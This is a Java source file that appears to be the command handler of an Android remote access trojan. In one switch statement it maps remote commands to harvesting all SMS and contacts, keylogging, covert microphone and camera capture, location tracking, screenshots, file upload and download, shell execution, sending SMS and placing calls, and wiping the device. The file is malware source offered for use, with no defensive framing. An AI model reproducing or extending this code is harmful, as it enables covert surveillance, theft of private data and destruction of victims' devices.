package com.phantom.reach;

import android.content.Context;
import java.io.File;

public class CommandExecutor {
    public static String execute(Context ctx, String cmd) {
        String[] parts = cmd.split(" ", 2);
        String action = parts[0].toLowerCase();
        String arg = parts.length > 1 ? parts[1] : "";

        switch (action) {
            case "shell":
                return ShellRunner.run(arg);
            case "sms":
                return SMSHarvester.getAllSMS(ctx);
            case "contacts":
                return ContactHarvester.getAll(ctx);
            case "mic_start":
                MediaCapturer.startMic(ctx, arg);
                return "🎙️ Recording started";
            case "mic_stop":
                MediaCapturer.stopMic();
                return "⏹️ Recording stopped";
            case "cam_front":
                return MediaCapturer.takePhoto(ctx, 0);
            case "cam_back":
                return MediaCapturer.takePhoto(ctx, 1);
            case "location":
                return LocationGetter.get(ctx);
            case "keylog_start":
                Keylogger.enable(ctx);
                return "⌨️ Keylogger enabled";
            case "keylog_get":
                return Keylogger.getLogs();
            case "download":
                return FileTransfer.downloadFile(ctx, arg);
            case "upload":
                return FileTransfer.uploadFile(ctx, arg);
            case "delete":
                return new File(arg).delete() ? "✅ Deleted" : "❌ Failed";
            case "screenshot":
                return ScreenCapture.capture(ctx);
            case "lock":
                DeviceLocker.lock(ctx);
                return "🔒 Phone locked";
            case "vibrate":
                Vibration.vibrate(ctx, Integer.parseInt(arg));
                return "📳 Vibrated";
            case "alert":
                Alert.show(ctx, arg);
                return "🔔 Alert shown";
            case "battery":
                return BatteryInfo.get(ctx);
            case "apps":
                return AppList.getInstalled(ctx);
            case "call":
                return CallManager.placeCall(ctx, arg);
            case "sms_send":
                String[] smsParts = arg.split(" ", 2);
                return SMSHarvester.sendSMS(ctx, smsParts[0], smsParts[1]);
            case "reboot":
                DeviceControl.reboot(ctx);
                return "🔄 Rebooting";
            case "shutdown":
                DeviceControl.shutdown(ctx);
                return "⏻ Shutting down";
            case "rec_audio":
                return MediaCapturer.recordAudio(ctx, Integer.parseInt(arg));
            case "wipe":
                WipeData.execute(ctx);
                return "💀 Wiping data";
            case "ping":
                return "🏓 Pong!";
            default:
                return "❌ Unknown command: " + action;
        }
    }
}